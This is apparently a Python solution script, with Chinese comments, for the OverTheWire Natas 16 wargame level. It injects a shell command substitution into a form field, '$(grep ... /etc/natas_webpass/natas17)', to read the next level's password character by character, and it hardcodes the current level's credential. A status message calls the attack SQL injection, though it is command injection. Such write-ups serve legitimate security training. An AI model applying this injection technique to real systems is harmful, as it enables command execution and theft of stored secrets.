import requests
import time
import os
from requests.auth import HTTPBasicAuth
#这个的区别是外部有个grep -i xxx dictionary
#所以只能找个词,然后利用正则, grep ^a natas17
#来暴力猜测内容,总共需要32*62词
#然后由于猜出结果后绝对不会是英语单词(找个刁钻的)
#所以输出是否是空白就成了判定真值(output=none == ture)
# 这一行是为了强制唤醒 Windows PowerShell/CMD 的 ANSI 颜色和光标控制功能
os.system('')

Natas16_psw = 'Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb'
# 1. 建立长连接 Session
s = requests.Session()
s.auth = HTTPBasicAuth('natas16', Natas16_psw)
url = "http://natas16.natas.labs.overthewire.org/index.php"

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

spinner = ['|', '/', '-', '\\']
spin_idx = 0

print("[*] Starting Blind SQL Injection...\n")  # 额外加一个 \n 腾出两行的空间

for i in range(32):
    for char in chars:
        spin_char = spinner[spin_idx % 4]
        spin_idx += 1

        # ================= UI =================
        # \r 回到第一行开头，打印当前猜测，\033[K 清除第一行尾部残留
        # \n 换到第二行，\r 回到第二行开头，打印已确认密码，\033[K 清除第二行尾部残留
        # \033[A 光标上移一行！回到第一行，为下一次循环做准备
        ui = f"\r{password}{spin_char}\033[K\n\ralready guessed: {password}\033[K\033[A"
        print(ui, end="", flush=True)
        # end="" 不换行，flush=True 强制刷新
        # ===============================================
        # 核心其实就是控制在哪行刷

        guess = password + char

        payload = f'$(grep ^{guess} /etc/natas_webpass/natas17)Africans'
        #'' or "" are identical in python
        while True:
            try:
                response = s.post(url, data={"needle": payload}, timeout=3)
                break
            except requests.exceptions.RequestException:
                # 如果网络卡顿，UI 依然保持双行结构，只是第一行变成警告
                warn_ui = f"\r[!] Lag... Retrying {char}\033[K\n\ralready guessed: {password}\033[K\033[A"
                print(warn_ui, end="", flush=True)
                time.sleep(1)

        # 检查是否猜中
        if "Africans" not in response.text:
            password += char
            break  # 跳出字母循环，开始猜下一个位置

# 结束后，打印两个换行符 \n\n，把光标推到 UI 下面，防止终端提示符覆盖
print(f"\n\n[SUCCESS] Final Password for Natas 17: {password}")
